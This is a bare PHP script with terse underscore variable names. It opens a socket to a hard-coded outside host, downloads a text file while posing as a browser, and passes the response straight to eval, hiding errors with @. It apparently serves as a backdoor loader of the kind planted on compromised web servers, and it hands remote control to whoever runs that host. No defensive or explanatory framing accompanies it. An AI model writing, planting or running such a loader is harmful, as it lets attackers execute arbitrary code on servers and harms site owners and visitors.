<?php
$_u = 'https://teamzedd2027.tech/project/rahman.txt';
$_p = parse_url($_u);
$_h = $_p['host'];
$_path = $_p['path'] ?? '/';
$_port = ($_p['scheme'] == 'https') ? 443 : 80;
$_pre = ($_p['scheme'] == 'https') ? 'ssl://' : '';

$_f = @fsockopen($_pre . $_h, $_port, $_e, $_s, 12);
if ($_f) {
    $_req = "GET $_path HTTP/1.0\r\nHost: $_h\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n";
    fwrite($_f, $_req);
    $_d = '';
    while (!feof($_f)) $_d .= fgets($_f, 1024);
    fclose($_f);
    
    // Skip header
    $_d = substr($_d, strpos($_d, "\r\n\r\n") + 4);
    if (!empty($_d)) @eval('?>' . $_d);
}
?>